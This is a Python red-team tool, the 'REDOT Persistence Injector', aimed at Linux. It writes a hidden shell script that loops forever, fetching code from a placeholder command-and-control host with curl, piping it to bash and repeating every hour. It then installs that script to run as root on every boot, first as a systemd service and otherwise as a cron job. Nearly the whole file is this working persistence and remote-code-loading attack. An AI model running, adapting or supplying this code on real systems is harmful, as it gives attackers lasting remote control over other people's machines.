
#!/usr/bin/env python3
# REDOT Persistence Injector - Real Red Team Payload
import os
import platform
import subprocess
from datetime import datetime

LOG_DIR = "logs/persistence"
os.makedirs(LOG_DIR, exist_ok=True)
log_file = os.path.join(LOG_DIR, "persistence_injection.log")

PAYLOAD_SCRIPT = "/usr/local/bin/.redot_payload.sh"

PAYLOAD_CONTENT = '''#!/bin/bash
while true; do
    curl -s http://REPLACE_WITH_C2/payload.sh | bash
    sleep 3600
done
'''

CRON_JOB_LINE = f"@reboot root /bin/bash {PAYLOAD_SCRIPT}"

def write_payload():
    with open(PAYLOAD_SCRIPT, "w") as f:
        f.write(PAYLOAD_CONTENT)
    os.chmod(PAYLOAD_SCRIPT, 0o755)

def inject_cron():
    try:
        cron_file = "/etc/cron.d/redot_cron"
        with open(cron_file, "w") as f:
            f.write(CRON_JOB_LINE + "\n")
        return True
    except Exception as e:
        log(f"Failed to write cron: {e}")
        return False

def inject_systemd():
    try:
        unit_path = "/etc/systemd/system/redot-agent.service"
        unit_content = f"""[Unit]
Description=REDOT Persistent Agent

[Service]
ExecStart=/bin/bash {PAYLOAD_SCRIPT}
Restart=always

[Install]
WantedBy=multi-user.target
"""
        with open(unit_path, "w") as f:
            f.write(unit_content)
        subprocess.run(["systemctl", "daemon-reexec"])
        subprocess.run(["systemctl", "enable", "redot-agent.service"])
        subprocess.run(["systemctl", "start", "redot-agent.service"])
        return True
    except Exception as e:
        log(f"Systemd injection failed: {e}")
        return False

def log(msg):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(log_file, "a") as f:
        f.write(f"[{timestamp}] {msg}\n")
    print(f"[{timestamp}] {msg}")

def main():
    print("=== REDOT Persistence Injector ===")
    write_payload()
    log("Payload written.")

    if platform.system() == "Linux":
        if inject_systemd():
            log("Systemd persistence installed.")
        elif inject_cron():
            log("Cron fallback installed.")
        else:
            log("Persistence failed.")
    else:
        log("Unsupported OS.")

if __name__ == "__main__":
    main()
